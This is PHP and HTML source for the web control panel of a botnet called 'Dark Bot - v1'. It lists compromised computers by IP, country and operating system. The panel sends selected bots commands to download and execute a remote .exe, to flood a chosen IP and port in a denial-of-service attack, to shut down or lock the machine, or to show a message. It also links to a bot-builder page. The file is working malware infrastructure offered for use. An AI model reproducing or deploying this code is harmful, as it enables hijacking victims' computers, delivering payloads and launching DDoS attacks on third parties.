<?php
session_start();
require_once('classes/class.bots.php');

$checkBots = new checkBots();
$checkBots->checkSession();

if(isset($_GET['online3']) && !isset($_GET['chid']))
{
	echo $checkBots->getOnlinebots().' / '.$checkBots->onlineBots();  echo 'Total Bots:<b>'.$checkBots->countBots().'</b>';
	exit;	
}

$pageid = isset($_POST['pageid']) ? $_POST['pageid'] : $_SERVER['REMOTE_ADDR'].time();

if(isset($_GET['chid']))
{
	$checkBots->setBotsCHK($_GET['chid'],$_GET['chk'],$_GET['pgdid']);
	exit;
}

if(isset($_GET['bbttss']))
{
	$checkBots->getBots($_GET['pgid']);
	exit;
}

if(isset($_POST['send_download']))
{
    foreach ($_POST as $key => $value) {
        if(strstr($key,"cmd_") !== false){
            $checkBots->setCommand("download ".$_POST['download'],str_replace("cmd_","",$key));
        }
    }
}

if(isset($_POST['send_attack']))
{
	
	$val = "";
	foreach($_POST['postdos'] as $value)
	{
	$val .= $value.'|'; 
	
	}
echo $val;
    foreach ($_POST as $key => $value) {
	
        if(strstr($key,"cmd_") !== false){
            $checkBots->setCommand('ddos '.$val,str_replace("cmd_","",$key));
        }
    }
}

if(isset($_POST['send_message']))
{
$empty = true;
$mes = "No bots selected! Can't send a message.";
$div = '<div class="alert alert-error">
  <button type="button" class="close" data-dismiss="alert"></button>
  <h4>Warning!</h4>
  '.$mes.'
</div>';


    foreach ($_POST as $key => $value) {
        if(strstr($key,"cmd_") !== false){
            $checkBots->setCommand('message '.$_POST['command_message'],str_replace("cmd_","",$key));
			$empty = false;
        }
    }
}

if(isset($_POST['send_command']))
{
$empty = true;
$mes = "No bots selected! Can't execute a command.";
$div = '<div class="alert alert-error">
  <button type="button" class="close" data-dismiss="alert"></button>
  <h4>Warning!</h4>
  '.$mes.'
</div>';

		foreach ($_POST as $key => $value) {
			if(strstr($key,"cmd_") !== false){
				$checkBots->setCommand($_POST['send_command'],str_replace("cmd_","",$key));
				$empty = false;
			}
		}
}

if(isset($_POST['send_browse']))
{
	if(isset($_POST['cmd_']))
    foreach ($_POST as $key => $value) {
        if(strstr($key,"cmd_") !== false){
            $checkBots->setCommand($_POST['browse'],str_replace("cmd_","",$key));
        }
    }
}

?>
<!DOCTYPE HTML>
<html>
<head>
	<title>Dark Bot - v1</title>
	<link type="text/css" rel="stylesheet" href="css/bootstrap.css" /> 
	<link type="text/css" rel="stylesheet" href="css/bootstrapSwitch.css" />
	<style>
		
		.container > .content {
background-color: rgba(0, 0, 0, 0.4);
background: rgba(0, 0, 0, 0.4);
			padding-left:15px;
			padding-top:10px;
			height:500px;
			border-radius:10px;
			      -webkit-border-radius: 10px 10px 10px 10px;
           -moz-border-radius: 10px 10px 10px 10px;
                border-radius: 10px 10px 10px 10px;
			-webkit-box-shadow: 0 1px 2px rgba(0,0,0,.15);
           -moz-box-shadow: 0 1px 2px rgba(0,0,0,.15);
                box-shadow: 0 1px 2px rgba(0,0,0,.15);
		}
	
		ul {
			padding-top:5px;
			padding-left:32%;
		}
		.btn {
			margin-bottom:2px;
		}
		
		
		
	</style>
	

<script type="text/javascript">
	function startRefresh(){
		requestX("bots.php?online3",document.getElementById("onlined"),1);
		requestX("bots.php?bbttss=1"+ "&pgid=" + document.getElementById("botts").className,document.getElementById("botts"),2);
		window.setTimeout("startRefresh()",300);
	}
	function chked(thus){
		requestX("bots.php?chid=" + thus.name + "&chk=" + thus.checked + "&pgdid=" + document.getElementById("botts").className,null,null);
	}
	var oldies = new Array();
	function requestX(url,element,mssg){
		var xmlhttpx;
		if (window.XMLHttpRequest){
			xmlhttpx=new XMLHttpRequest();
		}else{
			xmlhttpx=new ActiveXObject("Microsoft.XMLHTTP");
		}
			xmlhttpx.onreadystatechange=function(){
			if (xmlhttpx.readyState==4 && xmlhttpx.status==200){
				if(element != null){
					var newtextx = xmlhttpx.responseText;
					if (newtextx != oldies[mssg]){
						element.innerHTML=newtextx;
						oldies[mssg] =newtextx;
					}
				}
			}	
		}
		xmlhttpx.open("GET",url,true); 
		xmlhttpx.send();
	}

</script>
	
</head>
<body onload="startRefresh();">
	<ul class="nav nav-tabs">
		<?php 
			echo '<li class="active"><a href="bots.php">Main</a></li>';
if(isset($_SESSION['admin']))
	{
		echo '<li><a href="panel.php">Users</a></li>';
	}
echo '<li><a href="config.php">Settings</a></li>
		<li><a href="build.php">Create executable</a></li>
		<li><a href="logout.php">Logout</a></li>';
		?>
	</ul>
<div class="container">	
<?php if($empty){echo $div;}?>
	<div class="content">
		<h3>Your Bots</h3>
		<form action="" method="POST" >
		<input type="hidden" value="<?php echo $pageid; ?>" name="pageid">
		<div id="onlined">
		<?php echo $checkBots->getOnlinebots().' / '.$checkBots->onlineBots(); ?><?php echo 'Total Bots:<b>'.$checkBots->countBots().'</b>'; ?>
		</div>
		<table class="table table-hover">
			<thead>
				<tr>
					<th>Select</th>
					<th>Country</th>
					<th>PC-Name</th>
					<th>IP</th>
					<th>OS</th>
					<th>CMD</th>
					<th>Status</th>
				</tr>
			</thead>
			<tbody  id="botts" class="<?php echo $pageid; ?>">		
				<?php $checkBots->getBots(); ?>			
			</tbody>
		</table>
		<div class="well span10">
			<legend>Manage Bots</legend>
				<table>
					<tr>
					<td>
                <input type="button" class="btn" value="Toggle all bots" name="Toggle All" onclick='check_all()'>

					<!--<input type='button' name='checkall'  Toggle All<br /><br />-->
					</td>
						</tr>
						<tr>
						<td><div class="btn-group">
					  <a class="btn2">Send command</a>
					  <button class="btn dropdown-toggle" data-toggle="dropdown">
						<span class="caret"></span>
					  </button>
					  
					  <ul class="dropdown-menu">
						<li>
							<button name="send_command" value="remove" style="width:100%; border-radius:0px;border-left:none;border-right:none;" class="btn">Remove Bot</button>
						</li>
						<li>
							<button name="send_command" value="shutdown" style="width:100%; border-radius:0px;border-left:none;border-right:none;" class="btn">Shutdown PC</button>
						</li>
						<li>
							<button name="send_command" value="lock" style="width:100%;border-radius:0px;border-left:none;border-right:none;" class="btn">Lock PC</button>
						</li>
					  </ul>
					</div></td>
					</tr>
					<tr>
						<td><input type="text" name="command_message" placeholder="Your Message Here.." />
					<button name="send_message" class="btn">Send Message</button></td>
					</tr>
					<tr>
						<td><input type="text" placeholder="http://urlhere.com/filehere.exe" name="download">
					<button name="send_download" class="btn">Download and Execute</button></td>
					</tr>
					<tr>
						<td><input type="text" placeholder="IP address" name="postdos[]" style="width:120px;">	<input type="text" placeholder="Port" name="postdos[]" style="width:50px;"> <input type="text" placeholder="Time" name="postdos[]" style="width:50px;">
					<button name="send_attack" class="btn">Send Flood</button></td>
					</tr>
				</table>
				</div>				
			</div>
			
		</form>
	</div>
</div>	
<script type="text/javascript" src="js/jquery-1.9.1.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script type="text/javascript" language="javascript">

function check_all(){ 
    var node_list = document.getElementsByTagName('input'); 
    for (var i = 0; i < node_list.length; i++) { 
        var node = node_list[i]; 
        if (node.getAttribute('type') == 'checkbox') { 
			if (node.checked == 1){
            node.checked = 0; }
			else {
			node.checked = 1; }
        } 
    } 
}
</script>
</body>
</html>